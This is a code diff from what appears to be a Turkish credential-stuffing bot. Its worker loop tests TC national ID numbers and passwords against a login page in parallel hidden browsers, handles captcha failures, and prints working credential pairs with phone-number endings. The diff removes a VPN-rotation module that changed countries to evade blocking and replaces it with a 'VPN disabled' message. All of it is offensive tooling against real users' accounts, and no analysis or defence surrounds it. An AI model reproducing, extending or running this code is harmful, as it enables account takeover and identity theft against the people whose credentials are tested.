@@ -15,7 +15,6 @@ import atexit
 # Environment bootstrap – install required packages
 # -------------------------------------------------
 import platform
-from vpn_manager import vpn_bot
 
 import platform
 
@@ -422,8 +421,6 @@ def worker_loop(worker_id, task_queue, total_count):
                     is_captcha_wrong = any(k in err_lower for k in ['güvenlik kodu', 'guvenlik kodu', 'resimdeki', 'doğrulama kodu hatalı', 'dogrulama kodu hatali'])
                     if is_success:
                         account_tested = True
-                        vpn_bot.record_success()
-                        vpn_bot.record_query()
                         if phone_end:
                             safe_print(f'✅ [BASARILI | Tarayici-{worker_id}] {tc}:{password} -> {phone_end} NUMARASI SONU')
                         else:
@@ -434,16 +431,11 @@ def worker_loop(worker_id, task_queue, total_count):
                         task_queue.put((idx, tc, password))
                     elif has_error:
                         account_tested = True
-                        vpn_bot.record_success()
-                        vpn_bot.record_query()
                         safe_print(f'❌ [HATALI | Tarayici-{worker_id}] {tc} -> {err_message}')
                     else:
                         account_tested = True
-                        vpn_bot.record_success()
-                        vpn_bot.record_query()
                         safe_print(f'❌ [HATALI | Tarayici-{worker_id}] {tc} -> Giris basarisiz oldu.')
                 except Exception as e:
-                    vpn_bot.record_failure()
                     safe_print(f'[Tarayici-{worker_id} | {tc}] Baglanti/Sayfa hatasi (Hesap silinmedi!): {e}')
                     time.sleep(2)
                 finally:
@@ -487,10 +479,8 @@ def main():
         print(f'\n{num_browsers} adet gizli tarayici (arka planda) baslatiliyor...')
     else:
         print(f'\n{num_browsers} adet tarayici ekranda baslatiliyor...')
-    # VPN başlatılıyor
-    safe_print('[VPN] Sistem aktif ediliyor...')
-    vpn_bot.change_country(reason="Bot Başlangıcı")
-    atexit.register(vpn_bot.stop)
+    # VPN disabled – skip connection test
+    safe_print('[VPN] Disabled – skipping VPN connection test.')
     # Proceed directly to processing accounts
     task_queue = queue.Queue()
     for idx, (tc, password) in enumerate(accounts, start=1):
